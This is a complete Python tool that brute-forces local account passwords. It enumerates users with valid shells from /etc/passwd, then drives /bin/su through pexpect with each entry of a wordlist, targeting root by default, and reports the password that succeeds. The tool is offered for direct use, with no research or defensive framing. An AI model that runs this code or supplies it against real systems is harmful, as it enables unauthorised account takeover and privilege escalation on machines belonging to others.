#!/usr/bin/env python3


import pexpect
import argparse
from pyfiglet import Figlet


def cracker(user,password):
	output = pexpect.spawn("/bin/su - "+user, timeout=4)
	output.expect("Password:")
	output.sendline(password)
	auth_fail = output.expect(["su: Authentication failure", "[\$%%#]"])
	if(auth_fail==0):
		output.kill(0)
		return False
	else:
		output.kill(0)
		return True


def userSelecter():
	passwd =open('/etc/passwd').read()
	passwd = passwd.split('\n')
	validShells = open('/etc/shells').read().split('\n')
	user_List=[]
	for i in passwd:
		user = i.split(':')[0]
		shell = i.split(':')[-1]
		if shell in validShells:
			user_List.append(user)
	while("" in user_List):
		user_List.remove("")
	return user_List


def wordLists(path):
	try:
		wordList = open(path).read().split('\n');
		return(list(set(wordList)))
	except IOError as error:
		 return False;

def flagParser():
	parser = argparse.ArgumentParser(description='Powerful user password brute forcer on local /bin/su binary')
	parser.add_argument('-u','--user', default="root" ,help='username for attack (default: root)')
	parser.add_argument('-w','--wordlist',required=True ,help='dictonary file that help for attack')
	return parser.parse_args()

def main():
	
	args = flagParser();
	u=w=True
	users = userSelecter()
	word = wordLists(args.wordlist)
	#colors
	GREEN='\033[0;32m'
	NOCOLOR='\033[0m'
	RED='\033[0;31m'
	ORANGE='\033[0;33m'
	LIGHTBLUE='\033[1;34m'
	#end
	
	if(args.user not in users):
		print(RED+'[-]'+NOCOLOR+' Error : User does not exist or maybe `'+args.user+'` has no valid shell')
		u=False
	
	
	if(word == False):
		print(RED+'[-]'+NOCOLOR+' Error : Input File is Not Vaid')
		w=False
		
	
	if( u and w):
		print(LIGHTBLUE+'[*]'+NOCOLOR+'Dictonary \t: '+args.wordlist);
		print(LIGHTBLUE+'[*]'+NOCOLOR+'User \t: '+args.user);
		print(LIGHTBLUE+'[*]'+NOCOLOR+'Password Count : '+str(len(word))+'\n');
		
		for passwd in word :
			print('\r'+ORANGE+'[*]'+NOCOLOR+' Checking '+args.user+' : ' +passwd,end="\t\r")
			output = cracker(args.user,passwd)
			if( output):
				print(GREEN+'[+]'+NOCOLOR+' Password Found for user '+GREEN+args.user +NOCOLOR+' : '+GREEN+ passwd + NOCOLOR);
				break;
	else:
		exit
		

def banner():
	custom_fig = Figlet(font='mini')
	print(custom_fig.renderText('Hello World !!'))

if(__name__ =="__main__"):
	banner()
	main()